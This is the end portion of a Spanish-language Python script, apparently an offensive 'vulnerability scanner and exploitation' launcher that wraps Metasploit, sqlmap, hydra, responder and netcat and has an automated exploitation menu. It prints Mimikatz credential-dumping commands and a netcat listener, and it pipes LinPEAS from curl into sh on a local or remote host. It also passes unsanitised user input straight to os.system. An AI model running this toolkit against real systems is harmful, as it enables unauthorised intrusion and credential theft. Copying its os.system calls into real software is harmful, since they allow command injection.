                                print(f"{Colors.GREEN}{result.stdout}{Colors.RESET}")
                            if result.stderr:
                                print(f"{Colors.RED}{result.stderr}{Colors.RESET}")
                        except Exception as e:
                            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")


def herramientas_hacking():
    """Menú de herramientas de hacking y pentesting"""
    while True:
        print(f"\n{Colors.BLUE}{Colors.BOLD}==========================================")
        print(f"       HERRAMIENTAS DE INTRUSIÓN")
        print(f"=========================================={Colors.RESET}")
        print(f"{Colors.YELLOW}Accesos directos a herramientas de pentesting{Colors.RESET}\n")
        print("  1.  Metasploit Framework (msfconsole)")
        print("  2.  WPScan (WordPress Scanner)")
        print("  3.  SQLMap (Inyección SQL)")
        print("  4.  Nikto (Web Scanner)")
        print("  5.  Gobuster (Directory Bruteforcing)")
        print("  6.  FFUF (Fuzz Faster U Fool)")
        print("  7.  Burp Suite")
        print("  8.  Aircrack-ng (WiFi Hacking)")
        print("  9.  John the Ripper (Password Cracking)")
        print("  10. Hashcat (GPU Password Cracking)")
        print("  11. Nmap (Network Scanner)")
        print("  12. Hydra (Brute Force)")
        print("  13. SearchSploit (Exploit Database)")
        print("  14. Netcat (Swiss Army Knife)")
        print("  15. Wireshark/TShark (Packet Analysis)")
        print("  16. Dirb/Dirbuster (Directory Scanner)")
        print("  17. Commix (Command Injection)")
        print("  18. XSStrike (XSS Scanner)")
        print("  19. WhatWeb (Web Technology Scanner)")
        print("  20. TestSSL.sh (SSL/TLS Scanner)")
        print("  21. Nuclei (Vulnerability Scanner)")
        print("  22. Impacket (Python Library)")
        print("  23. responder (LLMNR/NBT-NS Poisoning)")
        print("  24. Mimikatz (Credential Dumping)")
        print("  25. LinPEAS (Linux Privilege Escalation)")
        print("  0.  Volver al menú principal")

        try:
            opt = input(f"\n{Colors.YELLOW}[?] Selecciona herramienta: {Colors.RESET}").strip()

            if opt == "0":
                break
            elif opt == "1":
                print(f"{Colors.GREEN}[*] Iniciando Metasploit...{Colors.RESET}")
                os.system("msfconsole")
            elif opt == "2":
                target = input(f"{Colors.YELLOW}[?] URL/Host objetivo: {Colors.RESET}")
                os.system(f"wpscan --url {target} --enumerate vp,vt,u")
            elif opt == "3":
                url = input(f"{Colors.YELLOW}[?] URL objetivo: {Colors.RESET}")
                os.system(f"sqlmap -u '{url}' --batch --dbs")
            elif opt == "4":
                target = input(f"{Colors.YELLOW}[?] Host objetivo: {Colors.RESET}")
                os.system(f"nikto -h {target}")
            elif opt == "5":
                url = input(f"{Colors.YELLOW}[?] URL base: {Colors.RESET}")
                wordlist = input(f"{Colors.YELLOW}[?] Wordlist (Enter para default): {Colors.RESET}") or "/usr/share/wordlists/dirb/common.txt"
                os.system(f"gobuster dir -u {url} -w {wordlist}")
            elif opt == "6":
                url = input(f"{Colors.YELLOW}[?] URL con FUZZ: {Colors.RESET}")
                os.system(f"ffuf -w /usr/share/wordlists/dirb/common.txt -u {url} -mc 200,301,302")
            elif opt == "7":
                print(f"{Colors.GREEN}[*] Iniciando Burp Suite...{Colors.RESET}")
                os.system("burpsuite")
            elif opt == "8":
                iface = input(f"{Colors.YELLOW}[?] Interfaz WiFi: {Colors.RESET}")
                print(f"{Colors.GREEN}[*] Iniciando Aircrack-ng suite...{Colors.RESET}")
                os.system(f"airodump-ng {iface}")
            elif opt == "9":
                archivo = input(f"{Colors.YELLOW}[?] Archivo de hashes: {Colors.RESET}")
                os.system(f"john {archivo}")
            elif opt == "10":
                archivo = input(f"{Colors.YELLOW}[?] Archivo de hashes: {Colors.RESET}")
                modo = input(f"{Colors.YELLOW}[?] Modo Hash (ej: 0=MD5, 100=SHA1): {Colors.RESET}")
                os.system(f"hashcat -m {modo} {archivo} /usr/share/wordlists/rockyou.txt")
            elif opt == "11":
                target = input(f"{Colors.YELLOW}[?] Host/Red objetivo: {Colors.RESET}")
                os.system(f"nmap -sV -sC {target}")
            elif opt == "12":
                target = input(f"{Colors.YELLOW}[?] IP objetivo: {Colors.RESET}")
                servicio = input(f"{Colors.YELLOW}[?] Servicio (ssh/ftp/mysql): {Colors.RESET}")
                usuario = input(f"{Colors.YELLOW}[?] Usuario: {Colors.RESET}")
                os.system(f"hydra -l {usuario} -P /usr/share/wordlists/rockyou.txt {target} {servicio} -V")
            elif opt == "13":
                busqueda = input(f"{Colors.YELLOW}[?] Buscar exploit: {Colors.RESET}")
                os.system(f"searchsploit {busqueda}")
            elif opt == "14":
                modo = input(f"{Colors.YELLOW}[?] Modo (listen/connect): {Colors.RESET}")
                if modo == "listen":
                    port = input(f"{Colors.YELLOW}[?] Puerto: {Colors.RESET}")
                    os.system(f"nc -lvnp {port}")
                else:
                    host = input(f"{Colors.YELLOW}[?] Host: {Colors.RESET}")
                    port = input(f"{Colors.YELLOW}[?] Puerto: {Colors.RESET}")
                    os.system(f"nc {host} {port}")
            elif opt == "15":
                iface = input(f"{Colors.YELLOW}[?] Interfaz (o dejar en blanco para lista): {Colors.RESET}")
                if iface:
                    os.system(f"tshark -i {iface}")
                else:
                    os.system("tshark -D")
            elif opt == "16":
                url = input(f"{Colors.YELLOW}[?] URL objetivo: {Colors.RESET}")
                os.system(f"dirb {url}")
            elif opt == "17":
                url = input(f"{Colors.YELLOW}[?] URL objetivo: {Colors.RESET}")
                os.system(f"commix --url='{url}' --batch")
            elif opt == "18":
                url = input(f"{Colors.YELLOW}[?] URL objetivo: {Colors.RESET}")
                os.system(f"xsstrike -u '{url}'")
            elif opt == "19":
                target = input(f"{Colors.YELLOW}[?] URL objetivo: {Colors.RESET}")
                os.system(f"whatweb {target}")
            elif opt == "20":
                target = input(f"{Colors.YELLOW}[?] Host objetivo: {Colors.RESET}")
                os.system(f"testssl.sh {target}")
            elif opt == "21":
                target = input(f"{Colors.YELLOW}[?] URL/Host objetivo: {Colors.RESET}")
                os.system(f"nuclei -u {target}")
            elif opt == "22":
                print(f"{Colors.CYAN}Impacket - Colección de herramientas Python{Colors.RESET}")
                print(f"  - nmapAnswer.py: Responder consultas NetBIOS")
                print(f"  - smbserver.py: Crear servidor SMB falso")
                print(f"  - psexec.py: Ejecución remota vía SMB")
                herramienta = input(f"{Colors.YELLOW}[?] Herramienta (ej: smbserver, psexec): {Colors.RESET}")
                if herramienta == "smbserver":
                    share = input(f"{Colors.YELLOW}[?] Nombre del share: {Colors.RESET}")
                    path = input(f"{Colors.YELLOW}[?] Ruta local: {Colors.RESET}")
                    os.system(f"smbserver.py {share} {path}")
                elif herramienta == "psexec":
                    target = input(f"{Colors.YELLOW}[?] Target: {Colors.RESET}")
                    os.system(f"psexec.py {target}")
            elif opt == "23":
                iface = input(f"{Colors.YELLOW}[?] Interfaz de red: {Colors.RESET}")
                print(f"{Colors.GREEN}[*] Iniciando Responder...{Colors.RESET}")
                os.system(f"sudo responder -I {iface} -dwv")
            elif opt == "24":
                print(f"{Colors.YELLOW}[!] Mimikatz requiere Windows y privilegios SYSTEM{Colors.RESET}")
                print(f"{Colors.CYAN}Comandos comunes:{Colors.RESET}")
                print(f"  privilege::debug")
                print(f"  token::elevate")
                print(f"  lsadump::sam")
                print(f"  lsadump::secrets")
                print(f"  lsadump::cache")
                print(f"  sekurlsa::logonpasswords")
            elif opt == "25":
                target = input(f"{Colors.YELLOW}[?] Host objetivo (dejar en blanco para local): {Colors.RESET}")
                if target:
                    os.system(f"ssh {target} 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'")
                else:
                    os.system("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh")
            else:
                print(f"{Colors.RED}[!] Opción no válida{Colors.RESET}")

            input(f"\n{Colors.GREEN}Presiona Enter para continuar...{Colors.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Volviendo al menú principal...{Colors.RESET}")
            break


def exploitation_menu(vulnerabilities):
    """Menú de explotación"""

    print(f"\n{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}  MÓDULO DE EXPLOTACIÓN AUTOMATIZADA{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}")

    selected_vuln, exploit_details = select_target_and_exploit(vulnerabilities)

    if not selected_vuln or not exploit_details:
        print(f"\n{Colors.YELLOW}[!] Operación cancelada{Colors.RESET}")
        return False

    print(f"\n{Colors.GREEN}{Colors.BOLD}[*] Vulnerabilidad seleccionada:{Colors.RESET}")
    print(f"    {selected_vuln['exploit_recommendation']}")
    print(f"    Objetivo: {selected_vuln['host']}:{selected_vuln['port']}")
    print(f"    Severidad: {selected_vuln['severity']}")

    tool = exploit_details.get('tool', 'manual')

    if tool == 'metasploit':
        return run_metasploit_exploit(selected_vuln['host'], exploit_details, selected_vuln)
    else:
        run_manual_exploit(selected_vuln['host'], exploit_details, selected_vuln)
        return True


# ============================================================================
# MENÚ PRINCIPAL
# ============================================================================

def main_menu():
    """Mostrar menú principal"""

    while True:
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*70}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}  MENÚ PRINCIPAL - VULNERABILITY SCANNER & EXPLOITATION{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'='*70}{Colors.RESET}")
        print(f"\n  {Colors.GREEN}[1]{Colors.RESET} Escanear vulnerabilidades + Exploits recomendados")
        print(f"  {Colors.GREEN}[2]{Colors.RESET} Herramientas de Intrusión")
        print(f"  {Colors.GREEN}[3]{Colors.RESET} Explotar vulnerabilidad detectada")
        print(f"  {Colors.GREEN}[4]{Colors.RESET} Salir")
        print(f"\n  {Colors.YELLOW}ADVERTENCIA: Solo use en sistemas autorizados{Colors.RESET}")

        try:
            choice = input(f"\n{Colors.BOLD}[?] Seleccione opción: {Colors.RESET}").strip()

            if choice == '1':
                # Opción 1: Escaneo con recomendación de exploits
                target = input(f"\n{Colors.YELLOW}[?] Ingresa el objetivo (IP/hostname): {Colors.RESET}").strip()
                if not target:
                    print(f"{Colors.RED}[!] Objetivo inválido{Colors.RESET}")
                    continue

                ports = input(f"{Colors.YELLOW}[?] Puertos específicos (Enter = todos): {Colors.RESET}").strip()
                output_dir = input(f"{Colors.YELLOW}[?] Directorio de salida (Enter = none): {Colors.RESET}").strip()

                print(f"\n{Colors.YELLOW}[!] Iniciando escaneo...{Colors.RESET}")
                print(f"{Colors.YELLOW}    Esto puede tomar varios minutos dependiendo del objetivo{Colors.RESET}")

                scan_output = run_nmap_scan(target, ports)
                vulnerabilities = parse_and_match_vulnerabilities(scan_output)
                display_vulnerability_report(vulnerabilities, target, output_dir if output_dir else None)

                # Guardar en sesión para explotación posterior
                if vulnerabilities:
                    print(f"\n{Colors.GREEN}[+] Se detectaron {len(vulnerabilities)} vulnerabilidades{Colors.RESET}")
                    print(f"{Colors.CYAN}[*] Puede usar la opción 3 para explotarlas{Colors.RESET}")

            elif choice == '2':
                # Opción 2: Herramientas de hacking
                herramientas_hacking()

            elif choice == '3':
                # Opción 3: Explotación
                target = input(f"\n{Colors.YELLOW}[?] Ingresa el objetivo (IP/hostname): {Colors.RESET}").strip()
                if not target:
                    print(f"{Colors.RED}[!] Objetivo inválido{Colors.RESET}")
                    continue

                ports = input(f"{Colors.YELLOW}[?] Puertos específicos (Enter = scan rápido): {Colors.RESET}").strip()

                print(f"\n{Colors.YELLOW}[*] Escaneando objetivo para detectar vulnerabilidades explotables...{Colors.RESET}")
                scan_output = run_nmap_scan(target, ports, timeout=300)
                vulnerabilities = parse_and_match_vulnerabilities(scan_output)

                if vulnerabilities:
                    display_vulnerability_report(vulnerabilities, target)
                    exploitation_menu(vulnerabilities)
                else:
                    print(f"\n{Colors.YELLOW}[!] No se detectaron vulnerabilidades explotables{Colors.RESET}")

            elif choice == '4':
                print(f"\n{Colors.CYAN}[+] Saliendo...{Colors.RESET}")
                break

            else:
                print(f"{Colors.RED}[!] Opción inválida{Colors.RESET}")

        except KeyboardInterrupt:
            print(f"\n\n{Colors.RED}[!] Programa interrumpido{Colors.RESET}")
            break

        except Exception as e:
            print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")


def main():
    """Función principal"""

    banner()

    # Verificaciones
    ok, issues, tools = check_requirements()

    if not ok:
        print(f"{Colors.RED}[!] Faltan requisitos:{Colors.RESET}")
        for issue in issues:
            print(f"    - {issue}")
        print(f"\n{Colors.YELLOW}    Instale: sudo apt install nmap{Colors.RESET}\n")

    print(f"{Colors.CYAN}[*] Herramientas disponibles: {', '.join(tools) if tools else 'ninguna'}{Colors.RESET}\n")

    check_root()

    # Iniciar menú
    main_menu()


if __name__ == '__main__':
    main()
